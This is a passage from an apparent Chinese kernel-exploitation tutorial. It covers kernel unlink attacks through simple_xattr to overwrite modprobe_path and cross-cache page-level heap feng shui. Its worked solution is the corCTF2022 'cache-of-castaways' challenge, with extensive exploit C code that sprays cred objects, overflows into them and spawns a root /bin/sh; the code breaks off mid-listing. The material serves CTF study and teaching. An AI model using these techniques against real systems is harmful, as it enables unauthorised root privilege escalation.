<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (likely(page == c-&gt;page)) &#123;</span><br><span class="line">	set_freepointer(s, tail_obj, c-&gt;freelist);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(</span><br><span class="line">			s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,</span><br><span class="line">			c-&gt;freelist, tid,</span><br><span class="line">			head, next_tid(tid)))) &#123;</span><br><span class="line"></span><br><span class="line">		note_cmpxchg_failure(<span class="string">&quot;slab_free&quot;</span>, s, tid);</span><br><span class="line">		<span class="keyword">goto</span> redo;</span><br><span class="line">	&#125;</span><br><span class="line">	stat(s, FREE_FASTPATH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ## Kernel Unlink 区别于用户态的 unlink 攻击，kernel
unlink 主要作用是借助 unlink 的指针互写操作来实现任意地址写数据。</p>
<p>unlink 基于 <code>list_del</code> 操作。伪造两个地址来替代
<code>list_head</code>
，这样其中一个地址就会被写到另一个地址上。如果我们能够控制
<code>prev</code> / <code>next</code> 指针，可以把 <code>prev</code>
指针设置为 <code>modprobe_path</code> ，这样就会在 [2] 处将
<code>next</code> 值写入 <code>prev</code> 指向的内存。</p>
<p>问题：[1] 处，<code>prev</code> 会写往
<code>next-&gt;prev</code>，这意味着 <code>next</code>
也必须是一个有效的指针，这限制了我们能写往 <code>prev</code>
的值。解决办法是，利用 <code>physmap</code> 提供一个有效的
<code>prev</code> 值。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __list_del(<span class="keyword">struct</span> list_head * prev, <span class="keyword">struct</span> list_head * next)</span><br><span class="line">&#123;</span><br><span class="line">	next-&gt;prev = prev; 				<span class="comment">// [1]</span></span><br><span class="line">	WRITE_ONCE(prev-&gt;next, next); 	<span class="comment">// [2]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> <code>physmap</code>
是一块内核虚拟内存，物理内存页连续映射到该处。例如，如果机器有 4G
内存（2^32 字节），需用 32 bit 来索引物理内存；假设 <code>physmap</code>
起始地址是 0xffffffff00000000，则 0xffffffff00000000~0xffffffffffffffff
范围内的值都有效。因此，若系统有 4G
内存（实际要求一般比这个低很多），攻击者可以控制 <code>prev</code> 的低
4 字节，只要高 4 字节表示 <code>physmap</code> 地址即可。</p>
<p>由于我们目标是修改 <code>modprobe_path</code> ，可以构造
<code>next = 0xffffxxxx2f706d74</code>（系统内存至少有 0x2f706d7c
字节，大概 760M），若 <code>prev = modprobe_path + 1</code>，利用 [2] 将
<code>modprobe_path</code> 覆写为 <code>/tmp/xxxxprobe</code> （其中
<code>xxxx</code> 是 <code>prev</code> 的高4字节）。后面即可提权。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">removexattr(<span class="string">&quot;suffix name&quot;</span>, XATTR_DELETION_NAME)</span><br></pre></td></tr></table></figure></div> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2f89af8c87cac62f00344bb476dd8e80.png"
                     
alt="在这里插入图片描述" 
                > ### simple_xattr 以
<code>simple_xattr</code>
结构体为例（所有有链表解链操作的结构体都可以），该结构体定义如下，可以看到该结构体中有一个
<code>list</code> 成员。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">simple_xattr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> value[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> 因此我们可以修改
<code>simple_xattr</code> 来实现 unlink 攻击。但是该技术需要知道哪个
<code>simple_xattr</code> 对象被覆盖了，否则随意移除 item 会导致遍历
list 时报错（如果移除的正常的 <code>simple_xattr</code> 与异常的
<code>simple_xattr</code> 相邻会将异常的 <code>simple_xattr</code>
链入双向链表中）。</p>
<p>识别被覆盖的 <code>simple_xattr</code> 对象有如下方法： - 如果修改
<code>simple_xattr</code> 的同时我们还能够读取 <code>simple_xattr</code>
那么我们可以在创建 <code>simple_xattr</code> 时通过设置
<code>value</code> 的值（<code>setxattr</code> 的 <code>value</code>
参数）来确定被覆盖的 <code>simple_xattr</code> 对象。 - 可以分配长度
0x100 字节的 <code>name</code>（<code>setxattr</code> 的
<code>name</code> 参数）那么 <code>simple_xattr -&gt;name</code>
指针的最低 1 字节 为 0 。此时我们在覆盖 <code>simple_xattr</code> 的
<code>list_head</code> 的同时还顺便将
<code>simple_xattr -&gt;name</code> 的最低 1 字节覆盖使得
<code>name</code> 指向原来 <code>name</code>
中间某个位置，这样我们就能确定被覆盖的 <code>simple_xattr</code> 对应的
<code>name</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="https://i-blog.csdnimg.cn/blog_migrate/8876d8528581a91e0798a311dbf131fc.png%20=70%x"
                     
alt="在这里插入图片描述" 
                > ## Page-level Heap Fengshui</p>
<p>Cross-Cache Overflow 实际上是针对 buddy system 的利用手法。</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9238c63e2b3ebdb287ce19b0dd2c8d24.png"
                     
alt="cross-cache overflow.png" 
                >
<figcaption aria-hidden="true">cross-cache overflow.png</figcaption>
</figure>
<p>当 freelist page 已经耗空且 partial 链表也为空时（或者
<code>kmem_cache</code> 刚刚创建后进行第一次分配时），其会向 buddy
system 申请页面：</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/8fb1a71c7f93b4c610c5bd5941da44b5.png"
                     
alt="image.png" 
                >
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>buddy system 基本原理就是以 2 的 order 次幂张内存页作为分配粒度，相同
order 间空闲页面构成双向链表，当低阶 order 的页面不够用时便会从高阶
order 取一份连续内存页拆成两半，其中一半挂回当前请求 order
链表，另一半返还给上层调用者；下图为以 order 2 为例的 buddy system
页面分配基本原理：</p>
<figure>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/5342f92979ae7f588c2058a4d2144d8b.gif"
                      alt="page.gif" 
                >
<figcaption aria-hidden="true">page.gif</figcaption>
</figure>
<p>我们不难想到的是：从更高阶 order 拆分成的两份低阶 order
的连续内存页<strong>是物理连续的</strong>，由此我们可以：</p>
<ul>
<li>向 buddy system 请求两份连续的内存页</li>
<li>释放其中一份内存页，在 <code>vulnerable kmem_cache</code>
上堆喷，让其取走这份内存页</li>
<li>释放另一份内存页，在 <code>victim kmem_cache</code>
上堆喷，让其取走这份内存页</li>
</ul>
<p><strong>此时我们便有可能溢出到其他的内核结构体上，从而完成
cross-cache overflow</strong></p>
<p><strong>注意 slub 申请的 object
位于线性映射区，因此溢出修改的是物理地址相邻的内存页。而 buddy system
的特性可以保证两个物理页物理地址相邻。</strong></p>
<p>在实际情况中我们无法准确控制 buddy system ，因此这一步骤改为：</p>
<ul>
<li>向 buddy system 请求大量的内存页</li>
<li>释放其中一半内存页，在 <code>vulnerable kmem_cache</code>
上堆喷，让其取走这些内存页</li>
<li>释放另一半内存页，在 <code>victim kmem_cache</code>
上堆喷，让其取走这些内存页</li>
</ul>
<p>这样我们有很大概率构造出上面那种情况，从而可以溢出到其他的内核结构体上完成
cross-cache overflow 。</p>
<h3 id="例题corctf2022---cache-of-castaways">例题：corCTF2022 -
cache-of-castaways</h3>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/corCTF2022-cache-of-castaways" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
<code>init_module</code> 创建了一个 <code>kmem_cache</code>，分配的
object 的 size 为 <code>512</code>，创建 flag 为
<code>SLAB_ACCOUNT | SLAB_PANIC</code>，同时开启了
<code>CONFIG_MEMCG_KMEM=y</code>，这意味着这是一个<strong>独立的
<code>kmem_cache</code></strong>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  castaway_dev = <span class="number">0xFF</span>;</span><br><span class="line">  qword_8A8 = (__int64)<span class="string">&quot;castaway&quot;</span>;</span><br><span class="line">  qword_8B0 = (__int64)&amp;castaway_fops;</span><br><span class="line">  _mutex_init(&amp;castaway_lock, <span class="string">&quot;&amp;castaway_lock&quot;</span>, &amp;_key_28999);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)misc_register(&amp;castaway_dev) )</span><br><span class="line">  &#123;</span><br><span class="line">    castaway_arr = (<span class="type">char</span> **)kmem_cache_alloc(kmalloc_caches[<span class="number">12</span>], <span class="number">0xDC0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( castaway_arr )</span><br><span class="line">    &#123;</span><br><span class="line">      castaway_cachep = kmem_cache_create(<span class="string">&quot;castaway_cache&quot;</span>, <span class="number">512LL</span>, <span class="number">1LL</span>, <span class="number">0x4040000</span>LL, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( castaway_cachep )</span><br><span class="line">        init_castaway_driver_cold();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>castaway_edit</code> 存在 6 字节溢出。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">castaway_edit</span><span class="params">(<span class="type">unsigned</span> __int64 index, <span class="type">size_t</span> size, __int64 buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> src[<span class="number">512</span>]; <span class="comment">// [rsp+0h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+200h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( index &gt; <span class="number">0x18F</span></span><br><span class="line">    || !castaway_arr[index]</span><br><span class="line">    || size &gt; <span class="number">0x200</span></span><br><span class="line">    || (_check_object_size(src, size, <span class="number">0LL</span>), copy_from_user(src, buf, size)) )</span><br><span class="line">  &#123;</span><br><span class="line">    castaway_edit_cold();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(castaway_arr[index] + <span class="number">6</span>, src, size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于 <code>kmem_cache</code> ， object
级别的利用不可用，因此考虑页级堆风水。</p>
<p>首先向 buddy system 请求大量的内存页。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* make buddy&#x27;s lower order clean, castaway_requesting from higher */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] spraying pgv pages...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_PAGE_NUM; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (alloc_page(i, getpagesize(), <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at no.%d socket\n&quot;</span>, i);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to spray pages via socket!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>释放其中一半内存页，在 <code>cred_jar</code>
上堆喷，让其取走这些内存页。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* free pages for cred */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] freeing for cred pages...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; PGV_PAGE_NUM; i += <span class="number">2</span>) &#123;</span><br><span class="line">    free_page(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* spray cred to get the isolate pages we released before */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] spraying cred...&quot;</span>);</span><br><span class="line">pipe(check_root_pipe);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; CRED_SPRAY_NUM; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, waiting_for_root_fn) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at cloning %d child\n&quot;</span>, i);</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to clone()!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于 <code>fork()</code>
在执行过程中会产生很多的”噪声“（即额外分配一些我们不需要的结构体，从而影响页布局），因此这里我们改用
<code>clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND)</code>
。</p>
<p>下面的代码相当于 fork 了一个进程执行 <code>waiting_for_root_fn</code>
函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> child_pipe_buf[<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> check_root_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="type">char</span> bin_sh_str[] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span> *shell_args[] = &#123;bin_sh_str, <span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">timer</span> =</span> &#123;</span><br><span class="line">        .tv_sec = <span class="number">100000000</span>,</span><br><span class="line">        .tv_nsec = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">waiting_for_root_fn</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    <span class="comment">/* we&#x27;re using the same stack for them, so we need to avoid cracking it.. */</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rax, [check_root_pipe]; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov edi, dword ptr [rax]; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov rsi, child_pipe_buf; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov edx, 1;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   xor eax, eax; &quot;</span> <span class="comment">/* read(check_root_pipe[0], child_pipe_buf, 1)*/</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall;      &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov eax, 102; &quot;</span> <span class="comment">/* getuid() */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   cmp eax, 0; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   jne failed; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rdi, [bin_sh_str];  &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rsi, [shell_args];  &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   xor edx, edx;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov eax, 59;    &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall;        &quot;</span>   <span class="comment">/* execve(&quot;/bin/sh&quot;, args, NULL) */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;failed: &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rdi, [timer]; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   xor esi, esi; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov eax, 35; &quot;</span>  <span class="comment">/* nanosleep() */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall; &quot;</span></span></span><br><span class="line"><span class="params">            )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((naked)) <span class="type">long</span> <span class="title function_">simple_clone</span><span class="params">(<span class="type">int</span> flags, <span class="type">int</span> (*fn)(<span class="type">void</span> *))</span> &#123;</span><br><span class="line">    <span class="comment">/* for syscall, it&#x27;s clone(flags, stack, ...) */</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">            <span class="string">&quot; mov r15, rsi; &quot;</span>   <span class="comment">/* save the rsi*/</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor esi, esi; &quot;</span>   <span class="comment">/* set esp and useless args to NULL */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor edx, edx; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor r10d, r10d; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor r8d, r8d;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor r9d, r9d;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; mov eax, 56;  &quot;</span>   <span class="comment">/* __NR_clone */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; syscall;      &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; cmp eax, 0;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; je child_fn;  &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; ret;          &quot;</span>   <span class="comment">/* parent */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;child_fn:      &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; jmp r15;      &quot;</span>   <span class="comment">/* child */</span></span></span><br><span class="line"><span class="params">            )</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>释放另一半内存页，在 <code>castaway_cache</code>
上堆喷，让其取走这些内存页，并且对每个申请的 object 溢出试图跨页溢出修改
<code>cred</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* free pages for our vulerable objects */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] freeing for vulnerable pages...&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_PAGE_NUM; i += <span class="number">2</span>) &#123;</span><br><span class="line">    free_page(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* spray vulnerable objects, hope that we can make an oob-write to cred */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring vulnerability in castaway kernel module...&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">*(<span class="type">uint32_t</span> *) &amp;buf[VUL_OBJ_SIZE - <span class="number">6</span>] = <span class="number">1</span>;    <span class="comment">/* cred-&gt;usage */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; VUL_OBJ_NUM; i++) &#123;</span><br><span class="line">    alloc();</span><br><span class="line">    edit(i, VUL_OBJ_SIZE, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>最后解除 <code>waiting_for_root_fn</code>
的阻塞，使其检查进程权限。如果进程被提权置 root 则返回 shell 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* checking privilege in child processes */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] notifying child processes and waiting...&quot;</span>);</span><br><span class="line">write(check_root_pipe[<span class="number">1</span>], buf, CRED_SPRAY_NUM);</span><br></pre></td></tr></table></figure></div>
<p>本题借助 <code>setsockopt()</code>
完成<strong>页级堆风水</strong>，相关原理在 kernel pwn
常用结构体总结中进行介绍。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_CRED_START (PGV_PAGE_NUM / 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_SPRAY_NUM 514</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_NUM 400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_SIZE 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_PER_SLUB 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_SLUB_NUM (VUL_OBJ_NUM / VUL_OBJ_PER_SLUB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">castaway_request</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> index;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xCAFEBABE</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int64_t</span> index, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">castaway_request</span> <span class="title">r</span> =</span> &#123;</span><br><span class="line">            .index = index,</span><br><span class="line">            .size = size,</span><br><span class="line">            .buf = buf</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xF00DBABE</span>, &amp;r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> child_pipe_buf[<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> check_root_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="type">char</span> bin_sh_str[] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span> *shell_args[] = &#123;bin_sh_str, <span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">timer</span> =</span> &#123;</span><br><span class="line">        .tv_sec = <span class="number">100000000</span>,</span><br><span class="line">        .tv_nsec = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">waiting_for_root_fn</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    <span class="comment">/* we&#x27;re using the same stack for them, so we need to avoid cracking it.. */</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rax, [check_root_pipe]; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov edi, dword ptr [rax]; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov rsi, child_pipe_buf; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov edx, 1;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   xor eax, eax; &quot;</span> <span class="comment">/* read(check_root_pipe[0], child_pipe_buf, 1)*/</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall;      &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov eax, 102; &quot;</span> <span class="comment">/* getuid() */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   cmp eax, 0; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   jne failed; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rdi, [bin_sh_str];  &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rsi, [shell_args];  &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   xor edx, edx;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov eax, 59;    &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall;        &quot;</span>   <span class="comment">/* execve(&quot;/bin/sh&quot;, args, NULL) */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;failed: &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rdi, [timer]; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   xor esi, esi; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov eax, 35; &quot;</span>  <span class="comment">/* nanosleep() */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall; &quot;</span></span></span><br><span class="line"><span class="params">            )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((naked)) <span class="type">long</span> <span class="title function_">simple_clone</span><span class="params">(<span class="type">int</span> flags, <span class="type">int</span> (*fn)(<span class="type">void</span> *))</span> &#123;</span><br><span class="line">    <span class="comment">/* for syscall, it&#x27;s clone(flags, stack, ...) */</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">            <span class="string">&quot; mov r15, rsi; &quot;</span>   <span class="comment">/* save the rsi*/</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor esi, esi; &quot;</span>   <span class="comment">/* set esp and useless args to NULL */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor edx, edx; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor r10d, r10d; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor r8d, r8d;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor r9d, r9d;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; mov eax, 56;  &quot;</span>   <span class="comment">/* __NR_clone */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; syscall;      &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; cmp eax, 0;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; je child_fn;  &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; ret;          &quot;</span>   <span class="comment">/* parent */</span></span></span><br><span class="line"><span class="params">            <span 